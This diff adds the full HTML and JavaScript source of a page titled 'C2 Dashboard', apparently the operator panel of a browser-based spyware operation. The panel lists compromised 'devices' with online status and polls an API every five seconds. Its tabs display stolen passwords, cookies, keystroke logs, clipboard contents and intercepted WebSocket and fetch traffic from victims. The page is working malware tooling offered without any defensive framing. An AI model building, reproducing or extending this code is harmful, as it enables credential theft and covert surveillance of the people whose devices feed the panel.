@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>C2 Dashboard</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
+    body { background: #0b0e14; color: #e0e0e0; display: flex; height: 100vh; }
+    #sidebar { width: 280px; background: #141a24; padding: 20px; overflow-y: auto; border-right: 1px solid #2a3344; }
+    #sidebar h2 { font-size: 18px; color: #7aa2f7; margin-bottom: 20px; letter-spacing: 1px; }
+    .device { padding: 12px; margin-bottom: 8px; border-radius: 8px; cursor: pointer; background: #1e2632; transition: 0.2s; border-left: 4px solid #2a3344; }
+    .device:hover { background: #283040; }
+    .device .name { font-weight: 600; }
+    .device .status { font-size: 12px; }
+    .device .status.online { color: #4ade80; }
+    .device .status.offline { color: #f87171; }
+    .device .last-seen { font-size: 11px; color: #8899bb; margin-top: 4px; }
+    .device.active { border-left-color: #7aa2f7; background: #1f2a3a; }
+    #main { flex: 1; display: flex; flex-direction: column; padding: 20px; overflow: hidden; }
+    #header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    #header h1 { font-size: 24px; font-weight: 300; color: #c8d0e0; }
+    #header .device-info { font-size: 14px; color: #8899bb; }
+    #tabs-container { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
+    .tab-btn { padding: 8px 16px; background: #1e2632; border: none; color: #b0c0d0; border-radius: 6px; cursor: pointer; transition: 0.2s; }
+    .tab-btn.active { background: #2a3a52; color: white; }
+    .tab-btn:hover { background: #283040; }
+    #content { flex: 1; overflow-y: auto; background: #111820; border-radius: 12px; padding: 16px; }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th { text-align: left; padding: 10px 8px; border-bottom: 1px solid #2a3344; color: #8899bb; font-weight: 400; }
+    td { padding: 8px; border-bottom: 1px solid #1e2632; word-break: break-all; max-width: 300px; }
+    tr:hover td { background: #1a222e; }
+    .empty { color: #667799; text-align: center; padding: 40px; }
+    .badge { background: #2a3a52; padding: 2px 10px; border-radius: 12px; font-size: 11px; color: #b0c0d0; }
+    .live { color: #4ade80; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+<div id="sidebar">
+  <h2>🎯 DEVICES</h2>
+  <div id="device-list"></div>
+</div>
+
+<div id="main">
+  <div id="header">
+    <h1 id="device-title">Select a device</h1>
+    <span class="device-info" id="device-status"></span>
+  </div>
+  <div id="tabs-container">
+    <button class="tab-btn active" data-tab="tabs">📂 Tabs</button>
+    <button class="tab-btn" data-tab="passwords">🔑 Passwords</button>
+    <button class="tab-btn" data-tab="cookies">🍪 Cookies</button>
+    <button class="tab-btn" data-tab="keylogs">⌨️ Keylogs</button>
+    <button class="tab-btn" data-tab="clipboard">📋 Clipboard</button>
+    <button class="tab-btn" data-tab="websocket">🔌 WebSocket</button>
+    <button class="tab-btn" data-tab="fetch">🌐 Fetch</button>
+  </div>
+  <div id="content">
+    <div class="empty">Select a device to view data</div>
+  </div>
+</div>
+
+<script>
+  // ===== Configuration =====
+  const WS_URL = `wss://${window.location.host}`;
+  let ws = null;
+  let currentDevice = null;
+  let currentTab = 'tabs';
+
+  // ===== WebSocket Connection (Dashboard client) =====
+  function connectWS() {
+    ws = new WebSocket(WS_URL + '?id=dashboard');
+    ws.onmessage = (e) => {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'device_list') {
+        renderDevices(msg.devices);
+      }
+    };
+    ws.onclose = () => setTimeout(connectWS, 3000);
+  }
+
+  // ===== Render Device List =====
+  function renderDevices(devices) {
+    const container = document.getElementById('device-list');
+    container.innerHTML = '';
+    devices.forEach(d => {
+      const div = document.createElement('div');
+      div.className = `device ${currentDevice === d.id ? 'active' : ''}`;
+      div.innerHTML = `
+        <div class="name">${d.id.slice(0, 8)}…</div>
+        <div class="status ${d.status}">${d.status.toUpperCase()}</div>
+        <div class="last-seen">${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'never'}</div>
+      `;
+      div.onclick = () => selectDevice(d.id);
+      container.appendChild(div);
+    });
+  }
+
+  // ===== Select a Device =====
+  function selectDevice(id) {
+    currentDevice = id;
+    document.getElementById('device-title').textContent = `Device ${id.slice(0, 8)}`;
+    document.getElementById('device-status').textContent = '';
+    // Highlight device in list
+    document.querySelectorAll('.device').forEach(el => el.classList.remove('active'));
+    document.querySelectorAll('.device').forEach(el => {
+      if (el.textContent.includes(id.slice(0, 8))) el.classList.add('active');
+    });
+    // Load initial tab data
+    loadTabData(currentTab);
+  }
+
+  // ===== Tab switching =====
+  document.querySelectorAll('.tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      currentTab = btn.dataset.tab;
+      if (currentDevice) loadTabData(currentTab);
+    });
+  });
+
+  // ===== Fetch data from REST API =====
+  async function loadTabData(tab) {
+    if (!currentDevice) return;
+    const container = document.getElementById('content');
+    container.innerHTML = '<div class="empty">Loading…</div>';
+
+    try {
+      let endpoint = '';
+      switch(tab) {
+        case 'tabs': endpoint = `/api/devices/${currentDevice}/tabs`; break;
+        case 'passwords': endpoint = `/api/devices/${currentDevice}/passwords`; break;
+        case 'cookies': endpoint = `/api/devices/${currentDevice}/cookies`; break;
+        case 'keylogs': endpoint = `/api/devices/${currentDevice}/keylogs`; break;
+        case 'clipboard': endpoint = `/api/devices/${currentDevice}/clipboard`; break;
+        case 'websocket': endpoint = `/api/devices/${currentDevice}/websocket`; break;
+        case 'fetch': endpoint = `/api/devices/${currentDevice}/fetch`; break;
+        default: return;
+      }
+      const res = await fetch(endpoint);
+      if (!res.ok) throw new Error('Network error');
+      const data = await res.json();
+      renderTable(tab, data);
+    } catch (e) {
+      container.innerHTML = `<div class="empty">Error loading data</div>`;
+    }
+  }
+
+  // ===== Render table =====
+  function renderTable(tab, data) {
+    const container = document.getElementById('content');
+    if (!data || data.length === 0) {
+      container.innerHTML = `<div class="empty">No data found</div>`;
+      return;
+    }
+
+    let headers = [];
+    let rows = [];
+    switch(tab) {
+      case 'tabs':
+        headers = ['URL', 'Title', 'Active', 'Timestamp'];
+        rows = data.map(r => [r.url, r.title, r.active ? '✅' : '', new Date(r.timestamp).toLocaleString()]);
+        break;
+      case 'passwords':
+        headers = ['URL', 'Username', 'Password', 'Timestamp'];
+        rows = data.map(r => [r.url, r.username, r.password, new Date(r.timestamp).toLocaleString()]);
+        break;
+      case 'cookies':
+        headers = ['Name', 'Value', 'Domain', 'Path', 'Secure', 'Timestamp'];
+        rows = data.map(r => [r.name, r.value, r.domain, r.path, r.secure ? '✅' : '', new Date(r.timestamp).toLocaleString()]);
+        break;
+      case 'keylogs':
+        headers = ['Key', 'Target', 'URL', 'Timestamp'];
+        rows = data.map(r => [r.key || '', r.target || '', r.url || '', new Date(r.timestamp).toLocaleString()]);
+        break;
+      case 'clipboard':
+        headers = ['Content', 'URL', 'Timestamp'];
+        rows = data.map(r => [r.content, r.url, new Date(r.timestamp).toLocaleString()]);
+        break;
+      case 'websocket':
+        headers = ['Content', 'URL', 'Timestamp'];
+        rows = data.map(r => [r.content, r.url, new Date(r.timestamp).toLocaleString()]);
+        break;
+      case 'fetch':
+        headers = ['URL', 'Body', 'Timestamp'];
+        rows = data.map(r => [r.url, r.body, new Date(r.timestamp).toLocaleString()]);
+        break;
+      default: return;
+    }
+
+    let html = `<table><thead><tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr></thead><tbody>`;
+    rows.forEach(row => {
+      html += `<tr>${row.map(cell => `<td>${escapeHtml(cell)}</td>`).join('')}</tr>`;
+    });
+    html += '</tbody></table>';
+    container.innerHTML = html;
+  }
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  // ===== Init =====
+  connectWS();
+  // Auto-refresh data every 5 seconds if a device is selected
+  setInterval(() => {
+    if (currentDevice) loadTabData(currentTab);
+  }, 5000);
+</script>
+</body>
+</html>
